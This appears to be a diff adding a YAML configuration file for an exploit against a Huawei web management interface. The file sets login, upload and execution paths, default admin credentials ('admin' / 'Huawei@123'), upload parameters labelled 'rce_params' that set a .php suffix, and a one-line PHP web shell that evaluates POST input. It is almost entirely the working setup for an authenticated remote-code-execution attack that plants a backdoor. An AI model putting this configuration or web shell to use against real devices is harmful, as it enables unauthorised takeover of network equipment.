@@ -1,0 +1,31 @@
+headers:
+  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+path:
+  login: /login_auth.php
+  upload: /webui/
+  exec: /auth/portal/adv/images/advLogo.php
+
+login_data:
+  user: admin
+  pwd: Huawei@123
+
+proxies:
+  http: http://127.0.0.1:8080
+  https: http://127.0.0.1:8080
+
+rce_params:
+  g: aaa_portal_auth_adv_submit
+  tab_name: ''
+  welcome_word: ''
+  btn_color: ''
+  suffix: .php
+  bkg_flag: 0
+  check_btn_color: ''
+  des: undefined
+
+rce_data:
+  name: logan
+  id: id
+
+file_content: <?php @eval($_POST["360qax"]);?>
